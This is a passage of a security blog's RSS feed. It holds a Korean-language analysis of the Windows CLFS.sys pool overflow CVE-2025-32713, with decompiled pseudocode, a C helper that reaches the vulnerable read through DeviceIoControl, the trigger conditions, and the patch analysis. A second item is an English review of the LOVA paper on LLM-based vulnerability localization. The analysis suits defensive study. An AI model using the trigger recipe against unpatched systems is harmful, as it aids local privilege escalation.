class="hljs-keyword">int</span>)nOutBufferSize &gt;= <span class="hljs-number">0x28</span>**    &amp;&amp; **(((_DWORD)nOutBufferSize + <span class="hljs-number">0x1D7</span>) &amp; <span class="hljs-number">0xFFFFFE00</span>) != <span class="hljs-number">0</span>**    &amp;&amp; **((nOutBufferSize + <span class="hljs-number">0x1D7</span>) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFE00</span>ui64) == (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)nOutBufferSize - <span class="hljs-number">0x28</span>i64**    &amp;&amp; *(_DWORD *)(v2 + <span class="hljs-number">16</span>) &gt;= <span class="hljs-number">8u</span> )  {    <span class="hljs-comment">// Calling CClfsLogXXXX<span class="hljs-doctag">XXX:</span>:ReadLogBlock</span>    ...  }  ...}</code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC139;&#xD130; &#xD06C;&#xAE30;(ContainerRawSectorSize)&#xAC00; 512byte &#xBCF4;&#xB2E4; &#xCEE4;&#xC57C; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xB370;, &#xADF8; &#xC774;&#xC720;&#xB294; <code>ClfsRequest::ReadLogBlock</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xCD5C;&#xC18C; &#xCD9C;&#xB825; &#xBC84;&#xD37C;(Buffer) &#xD06C;&#xAE30;&#xAC00; 552byte&#xB85C; &#xC81C;&#xC57D;&#xC774; &#xAC78;&#xB824;&#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="Direct-call-to-CLFS-sys-using-DeviceIoControl"><a href="#Direct-call-to-CLFS-sys-using-DeviceIoControl" class="headerlink" title="Direct call to CLFS.sys using DeviceIoControl"></a><strong>Direct call to CLFS.sys using DeviceIoControl</strong></h3><p>&#xCD94;&#xAC00;&#xB85C; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xB85C;&#xADF8; &#xB808;&#xCF54;&#xB4DC; &#xC77D;&#xAE30; &#xACFC;&#xC815;&#xC5D0;&#xC11C;&#xB294; &#xB85C;&#xADF8; &#xB9C8;&#xC0EC;&#xB9C1; &#xC601;&#xC5ED;&#xC774; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAD00;&#xB9AC;(&#xD06C;&#xAE30; &#xAC80;&#xC0AC; &#xBC0F; &#xBCF4;&#xD638; &#xC5ED;&#xD560;) &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB54C;, <code>CClfsLogFcbPhysical::ReadLogBlock</code> &#xD568;&#xC218;&#xB97C; IOCTL&#xB85C; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xACE0;, &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xB124; &#xBC88;&#xC9F8; &#xC778;&#xC790;(a4) &#xAC12;&#xC774; ReadLogRecord&#xC758; eContextMode &#xC778;&#xC790;&#xC5D0; &#xC758;&#xD574; &#xACB0;&#xC815;&#xB41C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-comment">// Implementation taken from &quot;CClfsMarshallingContext::ReadLogRecord&quot; and &quot;NtReadLogRecordInternal&quot; in clfsw32.dll</span><span class="hljs-function">BOOL <span class="hljs-title">ReadLogRecordWithDeviceIoControl</span><span class="hljs-params">(HANDLE hLog, CLFS_LSN targetLsn, CLFS_CONTEXT_MODE eContextMode, PVOID OutBuffer, DWORD OutBufferSize)</span> </span>{PVOID InBuffer = (PVOID)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-keyword">if</span> (!InBuffer) {<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed to allocate InBuffer.\\n&quot;</span>);<span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);}*(CLFS_LSN*)InBuffer = targetLsn;*(INT*)((CHAR*)InBuffer + <span class="hljs-number">8</span>) = (eContextMode == ClfsContextForward) + <span class="hljs-number">1</span>;<span class="hljs-keyword">return</span> DeviceIoControl(hLog, <span class="hljs-number">0x80076832</span>, InBuffer, <span class="hljs-number">0x10</span>, OutBuffer, OutBufferSize, &amp;OutBufferSize, <span class="hljs-number">0</span>);}</code></pre><p>&#xB530;&#xB77C;&#xC11C; <code>ReadLogRecordWithDeviceIoControl</code> &#xD568;&#xC218;&#xB97C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC0AC;&#xC6A9;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC720;&#xD6A8;&#xD55C; &#xB85C;&#xADF8; &#xC2DC;&#xD000;&#xC2A4; &#xBC88;&#xD638;(Log Sequence Number) &#xC0AC;&#xC6A9;</li><li>eContextMode &#xAC12;&#xC744; ClfsContextNone&#xC73C;&#xB85C; &#xC124;&#xC815;</li><li>&#xB17C;&#xB9AC; &#xC139;&#xD130; &#xBCF4;&#xB2E4; &#xC791;&#xC740; <code>OutBufferSize</code> &#xC0AC;&#xC6A9;</li></ul><p><img src="/2025/08/13/ogu123/cve-2025%E2%80%9332713/1.png" alt></p><p><img src="/2025/08/13/ogu123/cve-2025%E2%80%9332713/2.png" alt></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; BLF(Base Log File)&#xC774;&#xB098; &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xC790;&#xCCB4;&#xB97C; &#xC9C1;&#xC811; &#xC218;&#xC815;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCD5C;&#xADFC; CLFS&#xC5D0; &#xB3C4;&#xC785;&#xB41C; <a href="https://www.securityweek.com/microsoft-tackling-windows-logfile-flaws-with-new-hmac-based-security-mitigation/">HMAC &#xAE30;&#xBC18; &#xAC80;&#xC99D; &#xAE30;&#xB2A5;</a>&#xC73C;&#xB85C;&#xB294; &#xB9C9;&#xC744; &#xC218; &#xC5C6;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p>Windows 11 Insider Preview Canary Channel (&#xBE4C;&#xB4DC;: 27774.1000.amd64fre.rs_prerelease.250111-1221) &#xD658;&#xACBD;&#xC5D0;&#xC11C; CLFS HMAC &#xAE30;&#xB2A5;&#xC744; &#xD65C;&#xC131;&#xD654;&#xD558;&#xACE0; &#xD14C;&#xC2A4;&#xD2B8; &#xD55C; &#xACB0;&#xACFC;(clfs.sys 10.0.27774.1000) &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="Patch-Analysis"><a href="#Patch-Analysis" class="headerlink" title="Patch Analysis"></a><strong>Patch Analysis</strong></h3><pre><code class="hljs cpp">**<span class="hljs-comment">// Pseudo code of CClfsLogFcbPhysical::ReadLogBlock function**</span>**<span class="hljs-comment">// Execution flows not related to the patch are omitted.**</span><span class="hljs-function">__int64 __fastcall <span class="hljs-title">CClfsLogFcbPhysical::ReadLogBlock</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        CClfsLogFcbPhysical *<span class="hljs-keyword">this</span>,</span></span><span class="hljs-function"><span class="hljs-params">        struct _FILE_OBJECT *a2,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">const</span> <span class="hljs-keyword">union</span> _CLS_LSN *a3,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a4,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">const</span> struct _CLFS_READ_BUFFER *a5,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a6,</span></span><span class="hljs-function"><span class="hljs-params">        struct IClfsRequestAsync *a7,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">char</span> a8,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">union</span> _CLS_LSN *a9,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *a10)</span></span><span class="hljs-function"></span>{  ...  <span class="hljs-keyword">if</span> ( (_BYTE)v50    || a2-&gt;PrivateCacheMap    || (v13 = (**(__int64 (__fastcall ***)(CClfsLogFcbPhysical *, struct _FILE_OBJECT *, CClfsLogFcbPhysical *))<span class="hljs-keyword">this</span>)(                <span class="hljs-keyword">this</span>,                a2,                <span class="hljs-keyword">this</span>),        v42 = v13,        v13 &gt;= <span class="hljs-number">0</span>) )  {    ...    <span class="hljs-keyword">if</span> ( ClfsLsnLess(a3, (<span class="hljs-keyword">const</span> CLFS_LSN *)<span class="hljs-keyword">this</span> + <span class="hljs-number">59</span>) )    {      ...      <span class="hljs-keyword">for</span> ( i = a6; ; v22 = i )      {        ...        **<span class="hljs-comment">// Check if the size of a block to be read is not divisible by the logical sector size of the volume where the container is located**</span>        <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)Feature_4118818104__private_IsEnabledDeviceUsage() &amp;&amp; **CopyLength % ContainerRawSectorSize** )        {          v13 = <span class="hljs-number">0xC000000D</span>; **<span class="hljs-comment">// STATUS_INVALID_PARAMETER**</span>LABEL_51:          v42 = v13;          <span class="hljs-keyword">goto</span> LABEL_18;    **<span class="hljs-comment">// Release resources and return**</span>        }        ...        <span class="hljs-keyword">if</span> ( (_BYTE)v50 )        {          ...        }        <span class="hljs-keyword">else</span>        {          ...          <span class="hljs-keyword">if</span> ( FileOffset.HighPart &lt; <span class="hljs-number">0</span> || v29 &lt; <span class="hljs-number">0</span> )          {LABEL_65:            v13 = <span class="hljs-number">0xC01A000D</span>; **<span class="hljs-comment">// STATUS_LOG_METADATA_CORRUPT**</span>            <span class="hljs-keyword">goto</span> LABEL_51;          }          ...          **<span class="hljs-comment">// Check if the data to be copied exceeds the remaining space in the Buffer passed to the CcCopyRead function**</span>          <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)Feature_4118818104__private_IsEnabledDeviceUsage() )          {            <span class="hljs-keyword">if</span> ( FileOffset.QuadPart &lt; <span class="hljs-number">0</span> || **v30 - *a10 &lt; CopyLength** ) **<span class="hljs-comment">// v30 - *a10 means the remaning space in the Buffer**</span>              <span class="hljs-keyword">goto</span> LABEL_65; **<span class="hljs-comment">// Release resources and return STATUS_LOG_METADATA_CORRUPT**</span>          }          ...          **<span class="hljs-comment">// Copy data**</span>          <span class="hljs-keyword">if</span> ( CcCopyRead(a2, &amp;FileOffset, CopyLength, <span class="hljs-number">1u</span>, Buffer, &amp;IoStatus) )          {            ...          }  ...LABEL_18:  v14 = v40;  ...  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v13;}</code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Windows 6&#xC6D4; &#xB204;&#xC801; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; <code>CClfsLogFcbPhysical::ReadLogBlock</code> &#xD568;&#xC218; &#xB0B4;&#xBD80; overflow&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC744; &#xCD94;&#xAC00;&#xD574; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC77D;&#xC73C;&#xB824;&#xB294; &#xBE14;&#xB85D; &#xD06C;&#xAE30;(<code>CopyLength</code>)&#xAC00; &#xBCFC;&#xB968;&#xC758; &#xB17C;&#xB9AC; &#xC139;&#xD130; &#xD06C;&#xAE30;(ContainerRawSectorSize)&#xB85C; &#xB098;&#xB204;&#xC5B4;&#xB5A8;&#xC5B4;&#xC9C0;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;</li><li><code>CcCopyRead</code> &#xD568;&#xC218; &#xC2E4;&#xD589; &#xC804;, &#xB0A8;&#xC544; &#xC788;&#xB294; &#xBC84;&#xD37C; &#xACF5;&#xAC04;( <code>v30 - *a10</code> )&#xC774; &#xBCF5;&#xC0AC;&#xD560; &#xB370;&#xC774;&#xD130; &#xD06C;&#xAE30;(<code>CopyLength</code>)&#xBCF4;&#xB2E4; &#xC791;&#xC740;&#xC9C0; &#xAC80;&#xC0AC;</li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.securityweek.com/microsoft-tackling-windows-logfile-flaws-with-new-hmac-based-security-mitigation/">https://www.securityweek.com/microsoft-tackling-windows-logfile-flaws-with-new-hmac-based-security-mitigation/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/LPE/">LPE</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/CLFS/">CLFS</category>
      
      <category domain="https://hackyboiz.github.io/tags/pool-overflow/">pool overflow</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/13/ogu123/cve-2025%E2%80%9332713/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] LLM Security &amp; Safety Part 3. “Attention Is All You Need for LLM-based Code Vulnerability Localization” Review (EN)</title>
      <link>https://hackyboiz.github.io/2025/08/11/j0ker/llm_part3/en/</link>
      <guid>https://hackyboiz.github.io/2025/08/11/j0ker/llm_part3/en/</guid>
      <pubDate>Mon, 11 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;1-Introduction&quot;&gt;&lt;a href=&quot;#1-Introduction&quot; class=&quot;headerlink&quot; title=&quot;1. Introduction&quot;&gt;&lt;/a&gt;1. Introduction&lt;/h1&gt;&lt;p&gt;It&amp;#x2019;s been a w</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h1><p>It&#x2019;s been a while since my last post, but I&#x2019;m back! I originally told my team, &#x201C;I&#x2019;m going to analyze all of the Usenix papers using LLM and analyze the trends!&#x201D; But&#x2026; well&#x2026; that was wishful thinking, wasn&#x2019;t it? As expected, real life is not going so easy.</p><p><img src="/2025/08/11/j0ker/llm_part3/en/1.jpg" alt="index_img"></p><blockquote><p>When will slaves be able to be happy?</p></blockquote><p>So, I brought another paper this time. If you thought, &#x201C;Oh, this is something anyone would think of&#x201D; about the previous paper, this paper immediately made me think, &#x201C;Oh, this one is a little different.&#x201D; While other papers focused on the inference output of LLM through prompting, RAG, etc., this paper stood out in that it utilized the structure of LLM itself.</p><p>It is &#x201C;<a href="https://arxiv.org/html/2410.15288v1">Attention Is All You Need for LLM-based Code Vulnerability Localization,</a>&#x201D; which was published on Arxiv in October 2024. It seems that it was not submitted to any academic conference but only uploaded to the archive. The idea itself is good, but I think the conclusion part is a little disappointing.</p><h1 id="2-Paper-Review"><a href="#2-Paper-Review" class="headerlink" title="2. Paper Review"></a>2. Paper Review</h1><p>As the title &#x201C;Attention Is All You Need for LLM-based Code Vulnerability Localization&#x201D; suggests, this paper focuses on how the self-attention mechanism of LLM can be used to identify vulnerability locations. It is also an interesting point that the paper pays homage to &#x201C;Attention Is All You Need,&#x201D; which serves as the foundation for current LLMs. &#x1F604;</p><h2 id="2-1-Limitations-of-Existing-Methods"><a href="#2-1-Limitations-of-Existing-Methods" class="headerlink" title="2.1 Limitations of Existing Methods"></a>2.1 Limitations of Existing Methods</h2><h3 id="1-Lost-in-the-Middle"><a href="#1-Lost-in-the-Middle" class="headerlink" title="1) Lost in the Middle"></a>1) Lost in the Middle</h3><p>Before delving into the details, the paper points out that the biggest limitation of LLM in vulnerability detection is the &#x201C;decrease in inference accuracy in long contexts.&#x201D; It is said that when the code exceeds 300 lines, the accuracy drops below 5%.</p><p><img src="/2025/08/11/j0ker/llm_part3/en/2.png" alt="index_img"></p><p>The papers cited as evidence are as follows.</p><ul><li><a href="https://arxiv.org/pdf/2307.03172">Lost in the Middle: How Language Models Use Long Contexs</a></li><li><a href="https://arxiv.org/pdf/2406.10149">BABILong: Testing the Limits of LLMs with Long Context Reasoning-in-a-Haystack</a></li></ul><p>However, you probably don&#x2019;t want to read all these papers while reading this article, right? There is a YouTube channel that covers a similar topic, so you may want to check it out.</p><ul><li><a href="https://www.youtube.com/watch?v=EbN_DWM3DJc">OpenAI, Google, Claude are all the same&#x2026; Performance drops much more than expected as input length increases - How to respond | Context Engineering</a></li></ul><p>I haven&#x2019;t read the above content in detail, but it seems to be an issue where, as the number of tokens unrelated to the core content increases, the model fails to accurately focus on the content that requires attention. This is a problem that anyone who has used LLM services extensively, especially those who have tested them with long code snippets for vulnerability detection, has likely encountered at least once. When asking to identify vulnerabilities across multiple functions, issues such as forgetting or failing to recall the code may arise. However, I have noticed that these issues have improved significantly since late last year to early this year. Additionally, papers addressing these issues are beginning to emerge.</p><p>(This information was found by LLM. lol)</p><ol><li>Training method for finding information regardless of location</li></ol><ul><li>&#x201C;Never Lost in the Middle: Mastering Long-Context Question Answering with Position-Agnostic Decompositional Training&#x201D; (2024)<ul><li>Key points: To address this issue, we propose a new training method called &#x201C;Position-Agnostic Decompositional Training.&#x201D; Long questions are decomposed into multiple short questions, and the positions of the correct answers are intentionally mixed to train the model.</li><li>Solution: This reduces the model&#x2019;s reliance on the &#x2018;location&#x2019; of information and enhances its ability to find the necessary information regardless of context.</li></ul></li></ul><ol><li>Changing the structure of input data</li></ol><ul><li>&#x201C;Structured Packing in LLM Training Improves Long Context Utilization&#x201D; (2023)<ul><li>Key points: Instead of simply concatenating multiple documents in order for training, this method proposes providing the model with information that is structurally grouped (packing) together.</li><li>Solution: Strengthens the logical connectivity of information to help the model better understand and utilize information in the middle of the context.</li></ul></li></ul><ol><li>Improving the attention mechanism</li></ol><ul><li>&#x201C;Mixture-of-Recursions: Learning Dynamic Recursive Depths for Adaptive Token-Level Computation&#x201D; (2025)<ul><li>Key Points: Instead of treating all tokens equally, we propose the MoR (Mixture-of-Recursions) architecture, which identifies important tokens through a &#x201C;router&#x201D; and dynamically allocates more computations to those tokens.</li><li>Solution: By focusing computational resources on importance rather than location, we ensure that even core information in the middle of the context is processed deeply without being overlooked.</li></ul></li></ul><ol><li>Combination and Comparison with Retrieval-Augmented Generation (RAG)</li></ol><ul><li>&#x201C;Long Context vs. RAG for LLMs: An Evaluation and Revisits&#x201D; (2025)<ul><li>Key Points: This paper compares and analyzes the &#x201C;Long Context&#x201D; approach, which inputs the entire long context, and the RAG (Retrieval-Augmented Generation) approach, which retrieves only the necessary information from an external database.</li><li>Solution: RAG demonstrates that it can be an effective alternative to avoid the &#x201C;Lost in the Middle&#x201D; problem by initially &#x201C;searching&#x201D; for only the necessary information and presenting it at the beginning of the context. However, the analysis concludes that which method is superior depends on the type of task.</li></ul></li></ul><p>Looking at the above papers, we can see that research is being conducted to solve this problem in various aspects, such as training processes, training datasets, attention mechanisms, and context.</p><h3 id="2-Accuracy"><a href="#2-Accuracy" class="headerlink" title="2) Accuracy"></a>2) Accuracy</h3><p>The fundamental problem with LLM is the accuracy of the output results. Of course, it has improved significantly since ChatGPT 3.5 was first released, but false positives and false negatives still exist. To address this, the following advanced reasoning techniques have been employed:</p><ul><li><a href="https://arxiv.org/pdf/2203.11171">SELF-CONSISTENCY IMPROVES CHAIN OF THOUGHT REASONING IN LANGUAGE MODELS</a></li><li><a href="https://arxiv.org/pdf/2408.06195">MUTUAL REASONING MAKES SMALLER LLMS STRONGER PROBLEM-SOLVERS</a></li></ul><p>However, even these advanced prompting and CoT techniques rely on stochastic decoding to utilize multiple outputs for majority voting or scoring, which are considered incomplete methods.</p><ul><li>Stochastic decoding is one of the ways LLMs generate text, where tokens are randomly sampled from a calculated probability distribution. In other words, it does not always select the token with the highest probability but gives each token a chance to be selected proportional to its probability.</li><li>Conversely, deterministic decoding simply selects the token with the highest probability, ensuring the same output for the same input every time, but it can generate repetitive and less creative results.</li></ul><p>&#x201C;Due to this randomness, improvements in accuracy are minimal, and it is difficult to pinpoint the exact location of vulnerabilities!&#x201D; This is the second issue raised in this paper.</p><h2 id="2-2-Hypotheses-and-Experiments"><a href="#2-2-Hypotheses-and-Experiments" class="headerlink" title="2.2 Hypotheses and Experiments"></a>2.2 Hypotheses and Experiments</h2><h3 id="1-Hypotheses"><a href="#1-Hypotheses" class="headerlink" title="1) Hypotheses"></a>1) Hypotheses</h3><ol><li><p>When searching for vulnerable code, attention is focused on specific lines.</p></li><li><p>If instructed to search for vulnerabilities on specific lines, attention becomes stronger, potentially improving accuracy.</p></li><li><p>Lines containing vulnerabilities will influence the model&#x2019;s output.</p></li><li><p>Highlighting lines without vulnerabilities will not affect the results.</p></li></ol><h3 id="2-Experiment"><a href="#2-Experiment" class="headerlink" title="2) Experiment"></a>2) Experiment</h3><p>The paper first tests whether self-attention can be used to identify the location of vulnerabilities.</p><pre><code class="hljs yaml"><span class="hljs-attr">Code:</span>    <span class="hljs-string">....</span> <span class="hljs-attr">8:</span>     <span class="hljs-string">glyphs</span> <span class="hljs-string">=</span> <span class="hljs-string">(cairo_glyph_t</span> <span class="hljs-string">*)</span> <span class="hljs-string">gmalloc</span> <span class="hljs-string">(len</span>    <span class="hljs-string">*</span> <span class="hljs-string">sizeof</span> <span class="hljs-string">(cairo_glyph_t));</span> <span class="hljs-attr">9:</span>     <span class="hljs-string">glyphCount</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span><span class="hljs-attr">10:</span> <span class="hljs-string">}</span><span class="hljs-string">Pay</span> <span class="hljs-string">attention</span> <span class="hljs-string">to</span> <span class="hljs-string">line</span> {<span class="hljs-number">8</span>}<span class="hljs-string">.</span> <span class="hljs-string">Check</span> <span class="hljs-string">whether</span> <span class="hljs-string">there</span> <span class="hljs-string">are</span> <span class="hljs-string">vulnerabilities</span> <span class="hljs-string">in</span> <span class="hljs-string">it.</span><span class="hljs-attr">vulnerable line:</span> <span class="hljs-string">```</span></code></pre><p>To find vulnerabilities, write a prompt as shown above. When predicting words after ```, the code with vulnerabilities will receive the highest attention, right? Not only that, but it also tells you which line it is, maximizing the change in weight and allowing you to observe the change.</p><p><img src="/2025/08/11/j0ker/llm_part3/en/3.png" alt="index_img"></p><p>When testing with actual code without vulnerabilities and code with artificially inserted vulnerabilities based on the former,</p><ol><li>Upon checking the attention of code with and without vulnerabilities, it was found that, except for the 70th line where the vulnerability exists, the weights of other lines were high, indicating that the vulnerability was not properly identified.</li><li>When highlighting the 70th line to check the attention in both the code without vulnerabilities and the code with vulnerabilities, the weight of the 70th line increased slightly, and in the code with actual vulnerabilities, the weight was even higher.</li></ol><p>As shown above, this simple test demonstrates that vulnerabilities can be identified to some extent.</p><h1 id="3-LOVA-LO-cating-Vulnerabilities-via-Attention"><a href="#3-LOVA-LO-cating-Vulnerabilities-via-Attention" class="headerlink" title="3. LOVA(LO-cating Vulnerabilities via Attention)"></a>3. LOVA(LO-cating Vulnerabilities via Attention)</h1><p><img src="/2025/08/11/j0ker/llm_part3/en/4.png" alt="index_img"></p><p>The LOVA proposed in this paper compares the weights of unhighlighted code and highlighted code based on the results of the experiments described above to ultimately identify the code lines with the highest probability of containing vulnerabilities.</p><p>It is divided into three stages: Code Line Highlight, Attention Calculation, and Vulnerability Line Localization. Let&#x2019;s take a closer look at each one!</p><h2 id="3-1-Code-Line-Highlight"><a href="#3-1-Code-Line-Highlight" class="headerlink" title="3.1 Code Line Highlight"></a>3.1 Code Line Highlight</h2><p>LOVA creates two versions of prompts. One is the original code with no modifications (Base prompt), and the other is a version where each line of code is highlighted one by one (Highlighted prompts). If the code has 100 lines, one original prompt and 100 highlighted prompts are generated.</p><p>However, there is one problem here. Simply adding a comment like &#x201C;// Take a look here!&#x201D; or inserting specific keywords causes the LLM to ignore the code when it becomes long, or even causes hallucinations, mistaking normal code for vulnerable code.</p><p>Therefore, in LOVA, we directly specify the <strong>code line index</strong>. We add numbers to the front of the code and explicitly state in the prompt, &#x201C;Focus on line 8 and check for vulnerabilities!&#x201D;</p><h2 id="3-2-Attention-Calculation"><a href="#3-2-Attention-Calculation" class="headerlink" title="3.2 Attention Calculation"></a>3.2 Attention Calculation</h2><p>Next, we need to quantitatively calculate how the LLM&#x2019;s &#x2018;attention&#x2019; changes when each line is highlighted. The attention data output by the LLM is an enormous tensor in the form of (num_tokens, num_tokens, num_layers, num_heads).  The paper mentions that even a 1,000-token code can generate hundreds of millions of data points&#x2026; So, analyzing it myself might be faster, right?</p><p>LOVA performs dimensionality reduction as follows to retain only the information necessary for vulnerability analysis from this massive dataset.</p><p><img src="/2025/08/11/j0ker/llm_part3/en/5.png" alt="index_img"></p><blockquote><p>Pseudocode for Steps 1 to 4</p></blockquote><ol><li>Summarize the attention of all heads into a single attention map in the form of (num_tokens, num_tokens, num_layers) and merge them.</li><li>Maintain the attention of each layer as they have their own unique meanings.</li><li>Use the last token as a query (Q) to determine how much attention it receives from all previous tokens, and create a matrix of size (num_tokens, num_layers).</li><li>Sum the attention values of all tokens in each line to calculate the total attention value for that line, and create a matrix of size (num_lines, num_layers). This matrix is called LayerwiseAttnMat.</li><li><p>Calculate the difference between the LayerwiseAttnMat of the highlighted prompt and the base prompt to create DiffAttnMat. Instead of looking at the differences across all lines, we extract only the data from the &#x2018;instruction&#x2019; and &#x2018;highlighted line&#x2019; where the actual changes are expected to be the largest, and create the final <code>VulnAttnMat</code>.</p><p> <img src="/2025/08/11/j0ker/llm_part3/en/6.png" alt="image.png"></p></li></ol><h2 id="3-3-Vulnerability-Line-Localization"><a href="#3-3-Vulnerability-Line-Localization" class="headerlink" title="3.3 Vulnerability Line Localization"></a><strong>3.3 Vulnerability Line Localization</strong></h2><p>The final step is to select the lines with actual vulnerabilities based on the patterns in <code>VulnAttnMat</code>. While it is possible to rank them simply by the sum of attention changes, it is difficult to apply consistent criteria across languages because the vulnerability patterns in C and Python are different.  Furthermore, this is just a &#x201C;suspicious ranking,&#x201D; not an accurate judgment such as &#x201C;this line has an 80% probability of being vulnerable!&#x201D; Therefore, LOVA uses a deep learning model called <strong>Bi-LSTM</strong> at this stage. (Ugh&#x2026; it&#x2019;s getting more and more complicated&#x2026;)</p><ol><li>First, we create a long vector from the <code>VulnAttnMat</code> calculated for each line.</li><li>We feed this vector sequence into the Bi-LSTM model as input. The reason we use Bi-LSTM is that when determining whether a specific line (A) is suspicious, it is more accurate to compare it with the attention patterns of the preceding and following lines (B, C). In other words, it considers the context of the entire code in both directions.</li><li>The model ultimately outputs a &#x201C;suspicious score&#x201D; between 0 and 1 for each line, and if this score exceeds 0.5, it is judged to be vulnerable code.</li></ol><h1 id="4-Results"><a href="#4-Results" class="headerlink" title="4. Results"></a>4. Results</h1><p>The tests were conducted using the Big-Vul, SmartFix, and CVEFixes benchmarks, utilizing models with 10B or less, such as Llama-3.1-8B-Instruct, Mistral-7B-Instruct-v0.2, and Phi3.5-mini-instruct.</p><ul><li>LOVA demonstrated superior vulnerability location identification capabilities compared to existing LLM direct output methods, achieving up to a 5x performance improvement based on F1-score, especially in long code contexts.</li><li>LOVA achieved excellent vulnerability location identification results across various programming languages, showing up to a 14.6x improvement.</li><li>LOVA is applicable to various LLM architectures and shows consistent results.</li></ul><p>Overall, it shows impressive performance. It was also good to compare it with various techniques such as CoT, MoA, and rStar, assuming that the same model was used. Above all, I think the attempt to use the self-attention mechanism for vulnerability detection for the first time is meaningful.</p><h1 id="5-Areas-for-improvement"><a href="#5-Areas-for-improvement" class="headerlink" title="5. Areas for improvement"></a>5. Areas for improvement</h1><ol><li>Lack of comparison with larger models<ul><li>This paper tested using Llama-3.1-8B-Instruct, Mistral-7B-Instruct-v0.2, and Phi3.5-mini-instruct, but there is no comparison with larger models.<ul><li>To use the method described in this paper, an attention matrix must be created for each code line, which increases the time required and the number of matrices to be computed. I suspect that the hardware was insufficient to handle larger models.</li><li>In that case, it might be worth comparing it with the vanilla output of a larger model. (Oh, maybe I should try that myself&#x2026;) Even if it only comes out as &#x201C;comparable to the vanilla output of a larger model,&#x201D; it would still be meaningful, right?</li></ul></li></ul></li><li>Lack of comparison of power efficiency or computational cost<ul><li>LOVA highlights each code line individually to generate multiple versions of prompts, calculates the differences in attention maps between them, and goes through several other steps. Additionally, dimension reduction and the use of a Bi-LSTM classifier can increase complexity.<ul><li>This paper lacks mention of the time and financial costs incurred when applied to actual large-scale software projects. While dataset comparisons are useful for performance comparisons, it would be helpful to include measurements of how much additional computation is required as the amount of code increases. (The paper mentions that contexts exceeding 4,000 tokens were filtered to comply with LLM input constraints.)</li></ul></li></ul></li></ol><p>Well&#x2026; I&#x2019;ll wrap up this post here. I considered developing it further into a second part&#x2026; but my current life won&#x2019;t allow it. Haha. Then I&#x2019;ll be back for the next part! (Now I really need to watch Usenix&#x2026;)</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
